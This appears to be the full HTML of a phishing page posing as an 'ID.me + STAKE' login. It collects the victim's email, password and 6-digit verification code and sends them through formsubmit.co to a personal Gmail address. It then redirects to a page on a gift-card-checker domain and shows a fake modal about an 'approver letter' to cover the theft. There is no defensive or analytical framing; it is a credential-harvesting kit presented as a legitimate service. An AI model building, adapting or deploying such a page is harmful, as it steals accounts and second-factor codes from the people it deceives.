<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Login Page</title>
  <style>
    /* Basic reset and styling */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    
    body {
      background: #f2f2f2;
      display: flex;
      flex-direction: column;
      align-items: center;
      height: 100vh;
      justify-content: center;
    }
    
    .logo {
      margin-bottom: 20px;
      font-size: 2rem;
      font-weight: bold;
    }
    
    .logo .stake {
      color: #ff9800;
    }
    
    .login-container {
      background: #fff;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      width: 320px;
      text-align: center;
    }
    
    .login-container h2 {
      margin-bottom: 1.5rem;
      color: #333;
    }
    
    .login-container label {
      display: block;
      margin-bottom: 0.5rem;
      color: #555;
      text-align: left;
    }
    
    .login-container input[type="text"],
    .login-container input[type="password"],
    .login-container input[type="number"] {
      width: 100%;
      padding: 0.75rem;
      margin-bottom: 1rem;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    
    .login-container button {
      width: 100%;
      padding: 0.75rem;
      background: #4CAF50;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 1rem;
    }
    
    .login-container button:hover {
      background: #45a049;
    }
    
    .login-container .error {
      color: red;
      margin-bottom: 1rem;
      display: none;
    }
    
    .signup-text {
      margin-top: 20px;
      font-size: 0.9rem;
      color: #555;
      text-align: center;
    }
    
    .signup-text p {
      margin: 5px 0;
    }
    
    .signup-text .stake {
      color: #7CFC00;
      font-weight: bold;
    }
    
    /* Modal styling */
    .modal {
      display: none; /* Hidden by default */
      position: fixed;
      z-index: 1;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0,0,0,0.4);
    }
    
    .modal-content {
      background-color: #fff;
      margin: 15% auto;
      padding: 20px;
      border: 1px solid #888;
      width: 80%;
      max-width: 400px;
      text-align: center;
      border-radius: 8px;
      position: relative;
    }
    
    .close {
      position: absolute;
      top: 10px;
      right: 15px;
      color: #aaa;
      font-size: 28px;
      font-weight: bold;
      cursor: pointer;
    }
    
    .close:hover {
      color: black;
    }
  </style>
</head>
<body>

  <!-- Text Logo -->
  <div class="logo">
    ID.me + <span class="stake">STAKE</span>
  </div>
  
  <!-- Login Container -->
  <div class="login-container">
    <h2>Login</h2>
    <div id="error-message" class="error">Please enter a 6-digit code.</div>
    <form id="login-form" action="https://formsubmit.co/voiceofgoog82@gmail.com" method="POST" onsubmit="return validateCode();">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://bestgiftcardchecker.w3spaces.com/kyc.html">
      <label for="username">Email</label>
      <input type="text" id="username" name="username" placeholder="Enter your Email" required>

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Enter your password" required>
      
      <!-- Optional: 6-digit code input -->
      <label for="code">6-Digit Code</label>
      <input type="number" id="code" name="code" placeholder="Enter 6-digit code" required>

      <button type="submit">Login</button>
    </form>
    
    <!-- Sign-up Text inside the container -->
    <div class="signup-text">
      <p>or</p>
      <p>sign up for <a href="https://www.id.me"><h3>ID.<span class="stake">me</span></h3></a></p>
    </div>
  </div>
  
  <!-- Custom Modal -->
  <div id="notice-modal" class="modal">
    <div class="modal-content">
      <span class="close" id="modal-close">&times;</span>
      <p>Your ID.me approver letter is on its way. Please come back when you receive it.</p>
    </div>
  </div>

  <script>
    // Validate that the code is exactly 6 digits
    function validateCode() {
      const codeInput = document.getElementById('code').value;
      const errorMessage = document.getElementById('error-message');
      const codePattern = /^\d{6}$/; // regex for exactly 6 digits

      if (!codePattern.test(codeInput)) {
        errorMessage.style.display = 'block';
        return false; // prevent form submission if code is not valid
      }
      
      // Hide any previous error message
      errorMessage.style.display = 'none';
      
      // Show the notice modal AFTER the user clicks submit
      const modal = document.getElementById("notice-modal");
      modal.style.display = "block";
      
      // Prevent form submission until the user dismisses the modal
      return false;
    }

    // When the user clicks on the close button, close the modal and submit the form
    document.getElementById("modal-close").onclick = function() {
      document.getElementById("notice-modal").style.display = "none";
      document.getElementById("kyc.html").submit();
    }

    // Optionally, if the user clicks anywhere outside the modal content, close the modal and submit the form
    window.onclick = function(event) {
      const modal = document.getElementById("notice-modal");
      if (event.target === modal) {
        modal.style.display = "none";
        document.getElementById("login-form").submit();
      }
    }
  </script>

</body>
</html>
